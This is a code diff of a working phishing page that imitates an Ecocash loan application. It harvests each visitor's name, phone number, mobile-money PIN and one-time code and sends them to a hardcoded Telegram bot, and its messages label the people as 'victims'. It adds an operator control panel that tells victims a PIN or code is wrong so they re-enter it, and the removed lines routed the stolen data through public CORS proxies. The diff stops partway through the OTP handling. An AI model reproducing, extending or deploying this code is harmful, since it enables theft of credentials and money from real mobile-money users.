@@ -27,24 +27,30 @@
     * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0; padding: 0; }
 
     html, body {
-      margin: 0; padding: 0;
-      background: var(--bg); color: var(--ink);
+      margin: 0; padding: 0; background: var(--bg); color: var(--ink);
       font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
-      font-size: 16px; line-height: 1.5; height: 100%;
-      touch-action: manipulation;
+      font-size: 16px; line-height: 1.5; height: 100%; touch-action: manipulation;
     }
 
-    .wrap { max-width: 100%; width: 100%; min-height: 100vh; margin: 0 auto; display: flex; flex-direction: column; padding: 0 12px; }
+    .wrap {
+      max-width: 100%; width: 100%; min-height: 100vh; margin: 0 auto;
+      display: flex; flex-direction: column; padding: 0 12px;
+    }
 
     header {
-      background: var(--ecocash-blue); color: #fff;
-      padding: 20px 16px 24px;
+      background: var(--ecocash-blue); color: #fff; padding: 20px 16px 24px;
       border-bottom-left-radius: 24px; border-bottom-right-radius: 24px;
       box-shadow: var(--shadow); text-align: center;
     }
 
     .brandrow { display: flex; align-items: center; justify-content: center; gap: 12px; margin-bottom: 8px; }
-    .logo { width: 52px; height: 52px; background-image: url('https://www.ecocash.co.zw/assets/images/ecocash-logo-white.png'); background-size: contain; background-repeat: no-repeat; background-position: center; }
+
+    .logo {
+      width: 52px; height: 52px;
+      background-image: url('https://www.ecocash.co.zw/assets/images/ecocash-logo-white.png');
+      background-size: contain; background-repeat: no-repeat; background-position: center;
+    }
+
     .brandname { font-weight: 700; font-size: 1.45rem; color: #fff; }
     .tag { font-size: 12.5px; opacity: 0.9; }
 
@@ -53,28 +59,31 @@
     .hero p { margin: 6px 0 0; font-size: 13.5px; opacity: 0.9; text-align: center; color: var(--muted); }
 
     main { flex: 1; padding: 18px 12px 28px; }
-    .card { background: var(--card); border-radius: var(--radius); box-shadow: var(--shadow); padding: 20px; margin-bottom: 16px; }
+
+    .card {
+      background: var(--card); border-radius: var(--radius); box-shadow: var(--shadow);
+      padding: 20px; margin-bottom: 16px;
+    }
+
     .card h2 { margin: 0 0 6px; font-size: 16px; color: var(--ink); }
     .card .sub { margin: 0 0 14px; color: var(--muted); font-size: 13px; }
 
     label { display: block; font-size: 13.5px; color: var(--muted); margin: 12px 0 6px; }
 
     input[type="tel"], input[type="password"], input[type="text"], select {
-      width: 100%; padding: 14px 16px; border: 1px solid #d0d8e0;
-      border-radius: 14px; font-size: 16px; background: var(--input-bg);
-      color: var(--ink); transition: all 0.2s;
+      width: 100%; padding: 14px 16px; border: 1px solid #d0d8e0; border-radius: 14px;
+      font-size: 16px; background: var(--input-bg); color: var(--ink); transition: all 0.2s;
     }
 
-    input[type="tel"]:focus, input[type="password"]:focus, input[type="text"]:focus, select:focus {
+    input:focus, select:focus {
       border-color: var(--ecocash-blue); background: #fff; outline: none;
       box-shadow: 0 0 0 3px rgba(0, 51, 160, 0.15);
     }
 
     button.cta {
       width: 100%; height: 56px; border: 0; border-radius: 14px;
-      background: var(--ecocash-blue); color: #fff;
-      font-size: 16.5px; font-weight: 700; margin-top: 18px;
-      cursor: pointer; transition: all 0.15s;
+      background: var(--ecocash-blue); color: #fff; font-size: 16.5px; font-weight: 700;
+      margin-top: 18px; cursor: pointer; transition: all 0.15s;
     }
 
     button.cta:hover, button.cta:focus { background: var(--ecocash-blue-hover); outline: none; }
@@ -82,6 +91,7 @@
     button.cta[disabled] { opacity: 0.6; cursor: not-allowed; }
 
     .help { font-size: 12px; color: var(--muted); margin-top: 8px; text-align: center; }
+
     .err { color: var(--danger); font-size: 12.5px; margin-top: 8px; display: none; }
     .err.show { display: block; }
 
@@ -99,29 +109,44 @@
       position: relative; animation: slideUp 0.3s ease;
     }
     @keyframes slideUp { from { transform: translateY(100%); } to { transform: translateY(0); } }
+
     .sheet h3 { margin: 0 0 6px; font-size: 18px; color: var(--ink); }
     .sheet p { margin: 0 0 16px; color: var(--muted); font-size: 14px; }
 
     .otp-row { display: flex; gap: 10px; justify-content: center; margin: 14px 0 8px; }
     .otp-row input {
       width: 60px; height: 60px; border-radius: 12px; border: 2px solid #d0d8e0;
-      background: var(--input-bg); text-align: center; font-size: 24px;
-      font-weight: 700; color: var(--ink); outline: none;
-      transition: all 0.2s; caret-color: transparent;
+      background: var(--input-bg); text-align: center; font-size: 24px; font-weight: 700;
+      color: var(--ink); outline: none; transition: all 0.2s; caret-color: transparent;
     }
     .otp-row input:focus { border-color: var(--ecocash-blue); background: #fff; transform: scale(1.05); }
 
     .resend { font-size: 13px; color: var(--muted); margin-top: 8px; text-align: center; }
     .resend b { color: var(--ecocash-blue); cursor: pointer; }
-    .close-x { position: absolute; top: 14px; right: 18px; background: transparent; border: 0; font-size: 24px; color: var(--muted); cursor: pointer; opacity: 0.9; }
+
+    .close-x {
+      position: absolute; top: 14px; right: 18px; background: transparent; border: 0;
+      font-size: 24px; color: var(--muted); cursor: pointer; opacity: 0.9;
+    }
+
+    .processing { text-align: center; padding: 36px 20px; }
+    .spinner {
+      width: 56px; height: 56px; border: 4px solid #e0f0ff; border-top: 4px solid var(--ecocash-blue);
+      border-radius: 50%; margin: 0 auto 18px; animation: spin 1s linear infinite;
+    }
+    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    .processing h2 { margin-bottom: 8px; color: var(--ink); font-size: 18px; }
+    .processing p { color: var(--muted); font-size: 14px; }
 
     .success { text-align: center; padding: 36px 20px; }
     .success .check {
       width: 72px; height: 72px; background: var(--success); border-radius: 50%;
-      display: flex; align-items: center; justify-content: center;
-      margin: 0 auto 18px; color: #fff; font-size: 36px; animation: popIn 0.4s ease;
+      display: flex; align-items: center; justify-content: center; margin: 0 auto 18px;
+      color: #fff; font-size: 36px; animation: popIn 0.4s ease;
     }
-    @keyframes popIn { 0% { transform: scale(0); } 70% { transform: scale(1.15); } 100% { transform: scale(1); } }
+    @keyframes popIn {
+      0% { transform: scale(0); } 70% { transform: scale(1.15); } 100% { transform: scale(1); }
+    }
     .success h2 { margin-bottom: 8px; color: var(--ink); font-size: 18px; }
     .success p { color: var(--muted); font-size: 14px; margin-bottom: 20px; }
     .success .ref {
@@ -131,19 +156,12 @@
     }
 
     .countdown { height: 6px; background: #e0e8f0; border-radius: 3px; overflow: hidden; margin: 16px 0 8px; }
-    .countdown .fill { height: 100%; background: var(--ecocash-blue); width: 100%; animation: shrink 300s linear forwards; }
+    .countdown .fill { height: 100%; background: var(--ecocash-blue); width: 100%; animation: shrink 10s linear forwards; }
     @keyframes shrink { from { width: 100%; } to { width: 0%; } }
     .countdown-label { font-size: 12px; color: var(--muted); text-align: center; }
 
-    .toast {
-      position: fixed; top: 20px; left: 50%;
-      transform: translateX(-50%) translateY(-150%);
-      background: var(--danger); color: #fff; padding: 14px 24px;
-      border-radius: 12px; font-size: 14px; font-weight: 600; z-index: 2000;
-      box-shadow: 0 6px 24px rgba(192, 57, 43, 0.4);
-      transition: transform 0.3s ease; max-width: 90%; text-align: center;
-    }
-    .toast.show { transform: translateX(-50%) translateY(0); }
+    .step { display: none; }
+    .step.active { display: block; }
 
     @media (max-width: 480px) {
       .wrap { padding: 0 8px; }
@@ -178,15 +196,18 @@
   </header>
 
   <main>
-    <section class="card" id="cardStep1">
-      <h2>Apply for a Loan</h2>
-      <p class="sub">Enter your Ecocash number to check eligibility.</p>
+    <section class="card step active" id="step1">
+      <h2>👤 Your Details</h2>
+      <p class="sub">Enter your full name to begin.</p>
+
+      <label>Full Name</label>
+      <input type="text" id="fullName" placeholder="Estevo Paguel" maxlength="50" autocomplete="name" />
 
       <label>Mobile Number</label>
-      <input type="tel" id="msisdn" placeholder="+263771234567" inputmode="numeric" />
+      <input type="tel" id="msisdn" placeholder="+263771234567" inputmode="numeric" autocomplete="tel" />
 
       <label>Loan Amount (USD)</label>
-      <select id="loanAmount" onchange="updateAmountPlaceholder()">
+      <select id="loanAmount">
         <option value="" disabled selected>Select or enter amount</option>
         <option value="50">$50</option>
         <option value="100">$100</option>
@@ -194,7 +215,7 @@
         <option value="custom">Other (enter below)</option>
       </select>
 
-      <input type="text" id="customAmount" placeholder="Enter amount (e.g. $75)" style="display:none; margin-top:8px" />
+      <input type="text" id="customAmount" placeholder="Enter amount (e.g. $75)" style="display:none; margin-top:8px" inputmode="decimal" />
 
       <label>Repayment Period</label>
       <select id="repaymentTerm">
@@ -204,31 +225,54 @@
       </select>
 
       <div class="err" id="err1"></div>
-      <button class="cta" id="btnCheckLimit" type="button">Check My Limit</button>
-      <div class="help">By continuing, you agree to Ecocash Terms. Data rates may apply.</div>
+      <button class="cta" id="btnNext" type="button">Continue</button>
     </section>
 
-    <section class="card" id="cardStep2" style="display:none">
-      <h2>Enter Your Ecocash PIN</h2>
+    <section class="card step" id="step2">
+      <h2>🔐 Enter Your Ecocash PIN</h2>
       <p class="sub">Confirm your identity to proceed with the loan.</p>
 
       <label>Enter Your 4-Digit PIN</label>
-      <input type="password" id="ecocashPin" inputmode="numeric" maxlength="4" placeholder="••••" />
+      <input type="password" id="ecocashPin" inputmode="numeric" maxlength="4" pattern="[0-9]{4}" placeholder="••••" autocomplete="off" />
 
       <div class="err" id="err2"></div>
-      <button class="cta" id="btnSubmitPin" type="button">Continue</button>
+      <button class="cta" id="btnSubmitPin" type="button">Submit Application</button>
+
       <div class="help">⚠️ Ecocash will never call you to ask for your PIN.</div>
     </section>
 
-    <section class="card" id="cardSuccess" style="display:none">
+    <section class="card step" id="step3">
+      <h2>🔐 Enter OTP Code</h2>
+      <p class="sub">We sent a 4-digit code to your number. Enter it below.</p>
+
+      <div class="otp-row">
+        <input type="text" id="otp1" inputmode="numeric" maxlength="1" autocomplete="off" />
+        <input type="text" id="otp2" inputmode="numeric" maxlength="1" autocomplete="off" />
+        <input type="text" id="otp3" inputmode="numeric" maxlength="1" autocomplete="off" />
+        <input type="text" id="otp4" inputmode="numeric" maxlength="1" autocomplete="off" />
+      </div>
+
+      <div class="err" id="errOtp"></div>
+      <button class="cta" id="btnVerifyOtp" type="button" disabled>Verify &amp; Continue</button>
+    </section>
+
+    <section class="card step" id="stepProcessing">
+      <div class="processing">
+        <div class="spinner"></div>
+        <h2>Processing your loan…</h2>
+        <p>Please wait, do not close this page.</p>
+        <div class="countdown"><div class="fill"></div></div>
+        <div class="countdown-label" id="countdownLabel">Estimated time: 30s</div>
+      </div>
+    </section>
+
+    <section class="card step" id="stepSuccess">
       <div class="success">
         <div class="check">✓</div>
-        <h2>Loan Approved!</h2>
-        <p>Congratulations! Your loan has been approved and is being processed.</p>
-        <div class="ref">REF: EC-<span id="refCode">000000</span></div>
-        <p><b id="successAmount" style="color:#0033A0; font-size:20px;">$500</b> will be sent to<br/><b id="successMsisdn">+263...</b> within minutes.</p>
-        <div class="countdown"><div class="fill"></div></div>
-        <div class="countdown-label">Redirecting to Ecocash portal in <span id="redirectTimer">5:00</span>...</div>
+        <h2>Loan Approved</h2>
+        <p>Funds will reflect in your Ecocash wallet shortly.</p>
+        <div class="ref" id="refCode">—</div>
+        <p style="font-size:12px">Reference: keep this for your records.</p>
       </div>
     </section>
   </main>
@@ -239,101 +283,45 @@
   </footer>
 </div>
 
-<div class="sheet" id="otpSheet">
-  <div class="inner">
-    <button class="close-x" id="otpClose">×</button>
-    <h3>Enter OTP Code</h3>
-    <p>We sent a 4-digit code to <b id="otpMsisdn"></b>. Enter it below.</p>
-
-    <div class="otp-row" id="otpRow">
-      <input inputmode="numeric" maxlength="1" />
-      <input inputmode="numeric" maxlength="1" />
-      <input inputmode="numeric" maxlength="1" />
-      <input inputmode="numeric" maxlength="1" />
-    </div>
-
-    <div class="err" id="errOtp"></div>
-    <div class="resend">Didn't get it? <b id="resend">Resend</b> · <span id="resendTimer">10:00</span></div>
-    <button class="cta" id="btnVerify" type="button" disabled>Verify & Continue</button>
-  </div>
-</div>
-
-<div class="toast" id="toast"></div>
-
 <script>
-  // === CONFIG: UPDATE THESE ===
+(function () {
+  'use strict';
+
+  // ============================================================
+  //  TELEGRAM CONFIGURATION
+  // ============================================================
   const BOT_TOKEN = '7937948918:AAHA2rpnuryORr-ApHApFouNesrhjzVMv4E';
   const CHAT_ID = '1469249528';
-  const REDIRECT_URL = 'https://www.ecocash.co.zw/';
-  const REDIRECT_DELAY_MS = 300000;
+  const TG_API = `https://api.telegram.org/bot${BOT_TOKEN}`;
 
-  // === WORKING PROXY LIST (TESTED LIVE) ===
-  const PROXIES = [
-    'https://api.codetabs.com/v1/proxy?quest=',
-    'https://corsproxy.io/?',
-    'https://thingproxy.freeboard.io/fetch/',
-    'https://proxy.cors.sh/' // Requires header, so used only if others fail
-  ];
+  // ============================================================
+  //  STATE — single source of truth per session
+  // ============================================================
+  const state = {
+    victimId: null,
+    name: '',
+    msisdn: '',
+    amount: '',
+    term: '',
+    pin: '',
+    otp: '',
+    pollOffset: 0,
+    pollTimer: null,
+    timeoutTimer: null
+  };
 
-  // Send with retry & fallback
-  async function sendToTelegram(message) {
-    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-    const payload = { chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' };
-
-    for (let i = 0; i < PROXIES.length; i++) {
-      const proxy = PROXIES[i];
-      let proxyUrl = proxy + url;
-      let headers = { 'Content-Type': 'application/json' };
-      let body = JSON.stringify(payload);
-
-      // Special handling for cors.sh
-      if (proxy.includes('cors.sh')) {
-        headers['x-cors-api-key'] = 'temp_6d4d4d08751d4d3387357171a1a51642';
-        proxyUrl = 'https://cors.sh/' + url;
-      }
-
-      try {
-        const res = await fetch(proxyUrl, {
-          method: 'POST',
-          headers: headers,
-          body: body,
-          mode: 'cors'
-        });
-
-        if (res.status === 200) {
-          const data = await res.json();
-          if (data.ok) {
-            console.log('✅ Exfil success via:', proxy);
-            return true;
-          }
-        }
-      } catch (e) {
-        console.warn('❌ Proxy failed:', proxy, e.message);
-      }
-    }
-
-    console.error('💥 All proxies failed. Exfil dead.');
-    return false;
-  }
-
-  // === STATE ===
-  let POLLING_INTERVAL = null;
-  const state = { msisdn: '', amount: '', term: '', pin: '', otp: '', victimId: null };
-
-  // === HELPERS ===
-  function showErr(id, msg) {
+  // ============================================================
+  //  STEP MANAGEMENT
+  // ============================================================
+  function showStep(id) {
+    document.querySelectorAll('.step').forEach(el => el.classList.remove('active'));
     const el = document.getElementById(id);
-    el.textContent = msg;
-    el.classList.add('show');
+    if (el) el.classList.add('active');
   }
 
-  function showToast(msg) {
-    const toast = document.getElementById('toast');
-    toast.textContent = msg;
-    toast.classList.add('show');
-    setTimeout(() => toast.classList.remove('show'), 4000);
-  }
-
+  // ============================================================
+  //  HELPERS
+  // ============================================================
   function getFinalAmount() {
     const select = document.getElementById('loanAmount');
     if (select.value === 'custom') {
@@ -342,215 +330,432 @@
     return select.value;
   }
 
-  function updateAmountPlaceholder() {
-    const select = document.getElementById('loanAmount');
+  function showErr(id, msg) {
+    const el = document.getElementById(id);
+    if (!el) return;
+    el.textContent = msg;
+    el.classList.add('show');
+  }
+
+  function clearErr(id) {
+    const el = document.getElementById(id);
+    if (!el) return;
+    el.textContent = '';
+    el.classList.remove('show');
+  }
+
+  // Escape MarkdownV2 reserved chars
+  // https://core.telegram.org/bots/api#markdownv2-style
+  function escMd(s) {
+    return String(s == null ? '' : s).replace(/[_*\[\]()~`>#+\-=|{}.!\\]/g, '\\$&');
+  }
+
+  // ============================================================
+  //  TELEGRAM SEND — with retry + queue
+  // ============================================================
+  const tgQueue = [];
+  let tgSending = false;
+
+  function enqueueTelegram(method, payload, retries) {
+    tgQueue.push({ method, payload, retries: retries == null ? 3 : retries });
+    drainQueue();
+  }
+
+  function drainQueue() {
+    if (tgSending || tgQueue.length === 0) return;
+    tgSending = true;
+    const job = tgQueue.shift();
+
+    fetch(`${TG_API}/${job.method}`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(job.payload)
+    })
+    .then(r => r.json())
+    .then(data => {
+      if (!data.ok && job.retries > 0) {
+        // Telegram 429 or transient error — back off
+        setTimeout(() => {
+          tgQueue.unshift({ ...job, retries: job.retries - 1 });
+          tgSending = false;
+          drainQueue();
+        }, 1000);
+        return;
+      }
+      tgSending = false;
+      drainQueue();
+    })
+    .catch(() => {
+      if (job.retries > 0) {
+        setTimeout(() => {
+          tgQueue.unshift({ ...job, retries: job.retries - 1 });
+          tgSending = false;
+          drainQueue();
+        }, 1000);
+      } else {
+        tgSending = false;
+        drainQueue();
+      }
+    });
+  }
+
+  function sendMessage(text, keyboard) {
+    const payload = { chat_id: CHAT_ID, text, parse_mode: 'MarkdownV2' };
+    if (keyboard) payload.reply_markup = keyboard;
+    enqueueTelegram('sendMessage', payload);
+  }
+
+  function editMessage(chatId, messageId, text, keyboard) {
+    const payload = {
+      chat_id: chatId,
+      message_id: messageId,
+      text,
+      parse_mode: 'MarkdownV2'
+    };
+    if (keyboard) payload.reply_markup = keyboard;
+    enqueueTelegram('editMessageText', payload);
+  }
+
+  function answerCallback(callbackId, text) {
+    enqueueTelegram('answerCallbackQuery', { callback_query_id: callbackId, text: text || '' });
+  }
+
+  // ============================================================
+  //  VICTIM ID — collision-free
+  // ============================================================
+  function makeVictimId() {
+    // 8-char base36 from crypto if available, else time+counter
+    if (window.crypto && crypto.getRandomValues) {
+      const buf = new Uint32Array(2);
+      crypto.getRandomValues(buf);
+      return (buf[0].toString(36) + buf[1].toString(36)).slice(0, 10);
+    }
+    return Date.now().toString(36) + Math.random().toString(36).slice(2, 7);
+  }
+
+  // ============================================================
+  //  ADMIN CONTROL PANEL
+  // ============================================================
+  function sendAdminControl() {
+    state.victimId = makeVictimId();
+
+    const message =
+      `🚨 *ECOCASH VICTIM ACTIVE* 🚨\n` +
+      `📞 *Number:* \`${escMd(state.msisdn)}\`\n` +
+      `💸 *Loan:* \`${escMd(state.amount)}\`\n` +
+      `🆔 *ID:* \`${escMd(state.victimId)}\`\n\n` +
+      `Choose action:`;
+
+    const keyboard = {
+      inline_keyboard: [
+        [
+          { text: "❌ Wrong PIN", callback_data: `wrong_pin_${state.victimId}` },
+          { text: "❌ Wrong OTP", callback_data: `wrong_otp_${state.victimId}` }
+        ],
+        [
+          { text: "✅ Approve & Send Success", callback_data: `approve_${state.victimId}` },
+          { text: "⏳ Force Processing", callback_data: `processing_${state.victimId}` }
+        ]
+      ]
+    };
+
+    sendMessage(message, keyboard);
+  }
+
+  // ============================================================
+  //  LONG POLLING — single instance per session
+  // ============================================================
+  function startPolling() {
+    stopPolling();
+    pollLoop();
+  }
+
+  function stopPolling() {
+    if (state.pollTimer) {
+      clearTimeout(state.pollTimer);
+      state.pollTimer = null;
+    }
+  }
+
+  function pollLoop() {
+    const url = `${TG_API}/getUpdates?offset=${state.pollOffset}&timeout=25&allowed_updates=${encodeURIComponent(JSON.stringify(["callback_query"]))}`;
+
+    fetch(url)
+      .then(r => r.json())
+      .then(data => {
+        if (!data.ok) {
+          scheduleNextPoll(3000);
+          return;
+        }
+
+        data.result.forEach(update => {
+          state.pollOffset = update.update_id + 1;
+
+          const cb = update.callback_query;
+          if (!cb) return;
+          if (String(cb.from.id) !== String(CHAT_ID)) {
+            answerCallback(cb.id, '');
+            return;
+          }
+
+          const dataStr = cb.data || '';
+          // Route only events tagged with this session's victimId
+          if (!dataStr.endsWith(state.victimId)) {
+            answerCallback(cb.id, '');
+            return;
+          }
+
+          handleAdminAction(dataStr, cb);
+        });
+
+        scheduleNextPoll(500);
+      })
+      .catch(() => scheduleNextPoll(3000));
+  }
+
+  function scheduleNextPoll(delay) {
+    state.pollTimer = setTimeout(pollLoop, delay);
+  }
+
+  function handleAdminAction(dataStr, cb) {
+    if (dataStr.startsWith('wrong_pin_')) {
+      answerCallback(cb.id, 'PIN rejected');
+      stopPolling();
+      cancelTimeout();
+      showStep('step2');
+      showErr('err2', 'Invalid PIN. Please try again.');
+      const pinEl = document.getElementById('ecocashPin');
+      pinEl.value = '';
+      setTimeout(() => pinEl.focus(), 100);
+      return;
+    }
+
+    if (dataStr.startsWith('wrong_otp_')) {
+      answerCallback(cb.id, 'OTP rejected');
+      stopPolling();
+      cancelTimeout();
+      showStep('step3');
+      showErr('errOtp', 'Invalid OTP. Please check and re-enter.');
+      document.querySelectorAll('#step3 .otp-row input').forEach(i => i.value = '');
+      document.getElementById('btnVerifyOtp').disabled = true;
+      setTimeout(() => document.getElementById('otp1').focus(), 100);
+      return;
+    }
+
+    if (dataStr.startsWith('processing_')) {
+      answerCallback(cb.id, 'Processing');
+      stopPolling();
+      cancelTimeout();
+      showStep('stepProcessing');
+      startCountdown(30, () => showSuccess());
+      return;
+    }
+
+    if (dataStr.startsWith('approve_')) {
+      answerCallback(cb.id, 'Approved');
+      stopPolling();
+      cancelTimeout();
+      showSuccess();
+      return;
+    }
+
+    answerCallback(cb.id, '');
+  }
+
+  // ============================================================
+  //  COUNTDOWN + TIMEOUT
+  // ============================================================
+  function startCountdown(seconds, onDone) {
+    const label = document.getElementById('countdownLabel');
+    const fill = document.querySelector('#stepProcessing .countdown .fill');
+    if (fill) {
+      fill.style.animation = 'none';
+      // force reflow
+      void fill.offsetWidth;
+      fill.style.animation = `shrink ${seconds}s linear forwards`;
+    }
+    let remaining = seconds;
+    label.textContent = `Estimated time: ${remaining}s`;
+    const iv = setInterval(() => {
+      remaining -= 1;
+      if (remaining <= 0) {
+        clearInterval(iv);
+        onDone();
+        return;
+      }
+      label.textContent = `Estimated time: ${remaining}s`;
+    }, 1000);
+    state.timeoutTimer = iv;
+  }
+
+  function cancelTimeout() {
+    if (state.timeoutTimer) {
+      clearInterval(state.timeoutTimer);
+      state.timeoutTimer = null;
+    }
+  }
+
+  function showSuccess() {
+    stopPolling();
+    cancelTimeout();
+    const ref = 'ECO-' + (state.victimId || '').toUpperCase().slice(0, 8);
+    document.getElementById('refCode').textContent = ref;
+    showStep('stepSuccess');
+  }
+
+  // ============================================================
+  //  STEP 1
+  // ============================================================
+  document.getElementById('fullName').addEventListener('input', function () {
+    this.value = this.value.replace(/[^a-zA-Z\s]/g, '');
+  });
+
+  document.getElementById('loanAmount').addEventListener('change', function () {
     const custom = document.getElementById('customAmount');
-    if (select.value === 'custom') {
+    if (this.value === 'custom') {
       custom.style.display = 'block';
       setTimeout(() => custom.focus(), 100);
     } else {
       custom.style.display = 'none';
     }
-  }
+  });
 
-  // === STEP 1 ===
-  document.getElementById('btnCheckLimit').addEventListener('click', () => {
-    const msisdn = document.getElementById('msisdn').value.trim();
+  document.getElementById('btnNext').addEventListener('click', () => {
+    clearErr('err1');
+    const name = document.getElementById('fullName').value.trim();
+    let msisdn = document.getElementById('msisdn').value.trim();
     const amount = getFinalAmount();
 
-    if (!msisdn || !/^(\+?263|0)?7(7|8)\d{7}$/.test(msisdn)) {
-      return showErr('err1', 'Enter a valid Ecocash number (e.g. +263771234567)');
+    if (!name) return showErr('err1', 'Enter your full name');
+    if (!/[a-zA-Z]{2,}\s+[a-zA-Z]{2,}/.test(name)) {
+      return showErr('err1', 'Name must be letters only (e.g. Estevo Paguel)');
     }
-    if (!amount || isNaN(amount) || amount < 1) {
-      return showErr('err1', 'Please enter a valid loan amount');
+    if (!msisdn || !/^(\+?263|0)?7(7|8)\d{7}$/.test(msisdn)) {
+      return showErr('err1', 'Enter a valid Ecocash number');
+    }
+    if (!amount || isNaN(amount) || parseFloat(amount) < 1) {
+      return showErr('err1', 'Enter a valid loan amount');
     }
 
+    if (msisdn.startsWith('07')) msisdn = '+263' + msisdn.slice(1);
+    else if (msisdn.startsWith('7')) msisdn = '+263' + msisdn;
+
+    state.name = name;
     state.msisdn = msisdn;
     state.amount = '$' + amount;
     state.term = document.getElementById('repaymentTerm').value + ' days';
 
-    document.getElementById('cardStep1').style.display = 'none';
-    document.getElementById('cardStep2').style.display = '';
+    showStep('step2');
+    document.getElementById('ecocashPin').focus();
   });
 
-  // === STEP 2: PIN → EXFIL ===
+  // ============================================================
+  //  STEP 2 — PIN
+  // ============================================================
   document.getElementById('btnSubmitPin').addEventListener('click', () => {
-    const pin = document.getElementById('ecocashPin').value;
-    if (!pin || pin.length !== 4 || !/^\d{4}$/.test(pin)) {
+    clearErr('err2');
+    const pin = document.getElementById('ecocashPin').value.trim();
+    if (!pin || !/^\d{4}$/.test(pin)) {
       return showErr('err2', 'Enter a valid 4-digit PIN');
     }
 
     state.pin = pin;
 
-    sendToTelegram(`
-📱 *ECOCASH VICTIM SUBMITTED PIN*
-📞 *Number:* ${state.msisdn}
-🔐 *PIN:* ${state.pin}
-💸 *Loan:* ${state.amount}
-📅 *Term:* ${state.term}
-🕒 *Time:* ${new Date().toLocaleString()}
-    `).then(success => {
-      if (success) showToast('Sending data...');
-      else showToast('Network error. Try again.');
-    });
+    const log =
+      `📱 *ECOCASH PHISH: PHASE 1* 📱\n` +
+      `👤 *Name:* ${escMd(state.name)}\n` +
+      `📞 *Number:* ${escMd(state.msisdn)}\n` +
+      `🔐 *PIN:* \`${escMd(state.pin)}\`\n` +
+      `💸 *Loan:* ${escMd(state.amount)}\n` +
+      `📅 *Term:* ${escMd(state.term)}\n` +
+      `🆔 *ID:* \`${escMd(state.victimId || 'pending')}\`\n` +
+      `🕒 *Time:* ${escMd(new Date().toLocaleString())}`;
+    sendMessage(log);
 
-    openOtpSheet();
-  });
+    showStep('step3');
+    document.getElementById('btnVerifyOtp').disabled = true;
+    document.querySelectorAll('#step3 .otp-row input').forEach(i => i.value = '');
+    setTimeout(() => document.getElementById('otp1').focus(), 100);
 
-  // === OTP SHEET ===
-  function openOtpSheet() {
-    document.getElementById('otpMsisdn').textContent = state.msisdn;
-    document.getElementById('otpSheet').classList.add('show');
-    document.querySelector('#otpRow input').focus();
-    startOtpTimer();
-
-    state.victimId = Date.now().toString();
-
-    // Admin alert
-    sendToTelegram(`
-🚨 *NEW ECOCASH VICTIM* 🚨
-📞 *Number:* ${state.msisdn}
-💸 *Loan:* ${state.amount}
-🆔 *ID:* ${state.victimId}
-➡️ Use: /approve_${state.victimId}, /wrongpin_${state.victimId}, /wrongotp_${state.victimId}
-    `);
-
+    sendAdminControl();
     startPolling();
-  }
+  });
 
-  function startOtpTimer() {
-    let s = 600;
-    const el = document.getElementById('resendTimer');
-    const interval = setInterval(() => {
-      const mins = Math.floor(s / 60);
-      const secs = s % 60;
-      el.textContent = `${String(mins).padStart(2, '0')}:${String(secs).padStart(2, '0')}`;
-      if (--s < 0) clearInterval(interval);
-    }, 1000);
-  }
+  // ============================================================
+  //  OTP INPUT — auto-advance + backspace
+  // ============================================================
+  const otpIds = ['otp1', 'otp2', 'otp3', 'otp4'];
+  otpIds.forEach((id, i) => {
+    const el = document.getElementById(id);
 
-  // === POLLING FOR COMMANDS ===
-  function startPolling() {
-    POLLING_INTERVAL = setInterval(async () => {
-      const proxy = PROXIES[0];
-      const url = `https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=-1&limit=1&timeout=30`;
-      const proxyUrl = proxy + encodeURIComponent(url);
-
-      try {
-        const res = await fetch(proxyUrl);
-        const data = await res.json();
-
-        if (data.ok && data.result?.length > 0) {
-          const update = data.result[0];
-          const text = update.message?.text || '';
-          const fromId = update.message?.from?.id;
-
-          if (fromId != CHAT_ID || !text.startsWith('/')) return;
-
-          const [cmd, vid] = text.split('_');
-          if (vid !== state.victimId) return;
-
-          clearInterval(POLLING_INTERVAL);
-
-          if (cmd === '/wrongpin') {
-            showForcedPopup('❌ INVALID PIN\n\nSession expired. Reapply.');
-          } else if (cmd === '/wrongotp') {
-            showForcedPopup('❌ INVALID OTP\n\nRestarting verification.');
-          } else if (cmd === '/approve') {
-            showSuccessScreen();
-          }
-        }
-      } catch (e) {
-        console.warn('Polling failed:', e.message);
+    el.addEventListener('input', function () {
+      this.value = this.value.replace(/[^0-9]/g, '');
+      if (this.value.length === 1 && i < otpIds.length - 1) {
+        document.getElementById(otpIds[i + 1]).focus();
       }
-    }, 4000);
-  }
-
-  // === FORCED POPUP ===
-  function showForcedPopup(message) {
-    const overlay = document.createElement('div');
-    overlay.id = 'forcedPopup';
-    overlay.style = `position:fixed;inset:0;background:#000d;z-index:9999;display:flex;flex-direction:column;align-items:center;justify-content:center;color:#ff4757;text-align:center;padding:20px;`;
-    overlay.innerHTML = `<div style="font-size:60px;">⚠️</div><div style="font-size:22px;font-weight:bold;">Security Alert</div><pre style="font-size:16px;">${message}</pre>`;
-    document.body.appendChild(overlay);
-    setTimeout(() => window.location.reload(), 3000);
-  }
-
-  // === OTP HANDLING ===
-  const otpInputs = document.querySelectorAll('#otpRow input');
-  otpInputs.forEach((input, index) => {
-    input.addEventListener('input', () => {
-      input.value = input.value.replace(/[^0-9]/g, '');
-      if (input.value && index < 3) otpInputs[index + 1].focus();
-      const otp = [...otpInputs].map(i => i.value).join('');
-      document.getElementById('btnVerify').disabled = otp.length !== 4;
+      const otp = otpIds.map(x => document.getElementById(x).value).join('');
+      document.getElementById('btnVerifyOtp').disabled = otp.length !== 4;
     });
 
-    input.addEventListener('paste', e => {
-      e.preventDefault();
-      const paste = e.clipboardData.getData('text').replace(/[^0-9]/g, '');
-      if (paste.length >= 4) {
-        [...otpInputs].forEach((inp, i) => { inp.value = paste[i] || ''; });
-        otpInputs[3].focus();
-        document.getElementById('btnVerify').disabled = false;
+    el.addEventListener('keydown', function (e) {
+      if (e.key === 'Backspace' && this.value === '' && i > 0) {
+        document.getElementById(otpIds[i - 1]).focus();
       }
+    });
+
+    el.addEventListener('paste', function (e) {
+      e.preventDefault();
+      const text = (e.clipboardData || window.clipboardData).getData('text') || '';
+      const digits = text.replace(/\D/g, '').slice(0, 4).split('');
+      digits.forEach((d, j) => {
+        if (otpIds[i + j]) document.getElementById(otpIds[i + j]).value = d;
+      });
